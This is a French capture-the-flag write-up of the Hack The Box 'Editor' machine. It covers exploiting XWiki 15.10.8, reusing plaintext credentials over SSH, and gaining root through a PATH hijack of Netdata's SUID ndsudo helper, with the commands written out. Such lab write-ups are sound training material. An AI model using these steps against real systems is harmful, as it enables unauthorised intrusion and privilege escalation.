# CTF – Editor (Writeup)

## Contexte

Dans ce challenge Hack The Box, je cible une machine exposant plusieurs services web.  
L’objectif est d’obtenir un accès initial, puis d’escalader mes privilèges jusqu’à devenir **root**.

---

## Reconnaissance

Je commence par un scan Nmap afin d’identifier les services exposés :

    nmap -sC -sS -sV 10.10.11.80

Le scan révèle :
- un service HTTP sur le port 80
- un service HTTP sur le port 8080

En accédant au port 8080, j’identifie une instance **XWiki** (version 15.10.8).

---

## Accès initial – Exploitation XWiki

La version XWiki 15.10.8 est vulnérable à une faille permettant d’obtenir un accès au serveur XWiki.

Après exploitation, je fouille les fichiers de configuration présents sur le serveur et découvre des identifiants stockés en clair.

Je récupère les credentials suivants :

- Utilisateur : oliver  
- Mot de passe : t********9  

Je peux alors me connecter en SSH :

    ssh oliver@10.10.11.80

---

## Énumération locale

Une fois connecté en tant que `oliver`, je commence par transférer **linPEAS** afin d’automatiser l’énumération.

Depuis ma machine :

    scp ./linpeas.sh oliver@10.10.11.80:/tmp/

Puis sur la machine cible :

    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh

L’outil ne révèle rien d’évident immédiatement. Je décide donc de rechercher manuellement les binaires SUID appartenant à root.

---

## Recherche de binaires SUID

Je lance la commande suivante :

    find / -user root -perm -4000 -print 2>/dev/null

Résultat notable :

    /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
    /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
    /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
    /opt/netdata/usr/libexec/netdata/plugins.d/ioping
    /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
    /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
    /usr/bin/newgrp
    /usr/bin/gpasswd
    /usr/bin/su
    /usr/bin/umount
    /usr/bin/chsh
    /usr/bin/fusermount3
    /usr/bin/sudo
    /usr/bin/passwd
    /usr/bin/mount
    /usr/bin/chfn
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/libexec/polkit-agent-helper-1

Un élément attire mon attention : **ndsudo**, un plugin lié à **Netdata**.

---

## Analyse de ndsudo

Après recherche, je découvre qu’il existe un **PoC public** exploitant `ndsudo`.  
L’utilisateur `oliver` fait partie du groupe **netdata**, ce qui rend l’exploitation possible.

Le principe de l’attaque repose sur un détournement de binaire appelé par `ndsudo`.

---

## Escalade de privilèges via ndsudo

Je récupère un code C public depuis GitHub et je le compile sur ma machine sous le nom `nvme`.

Sur ma machine :

    gcc exploit.c -o nvme

Je transfère ensuite le binaire sur la machine cible :

    scp nvme oliver@10.10.11.80:/tmp/nvme

Sur la machine cible :

    chmod +x /tmp/nvme
    export PATH=/tmp:$PATH

Je lance ensuite la commande vulnérable :

    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

Grâce à la manipulation du PATH et à l’appel de `ndsudo`, le binaire est exécuté avec les privilèges **root**.

Je deviens alors directement **root** sur la machine.

---

## Conclusion

Ce challenge met en évidence :
- les risques liés aux applications web vulnérables (XWiki)
- le danger des identifiants stockés en clair
- l’importance des groupes système mal configurés
- l’impact critique de binaires SUID exploitables comme `ndsudo`

L’exploitation combine :
- compromission applicative
- récupération de credentials
- accès SSH
- escalade de privilèges via un plugin Netdata vulnérable

---

## Compétences démontrées

- Reconnaissance réseau (Nmap)
- Exploitation de CMS vulnérable (XWiki)
- Recherche et exploitation de credentials
- Énumération locale Linux
- Analyse de binaires SUID
- Exploitation de PoC publics
- Escalade de privilèges via détournement de PATH
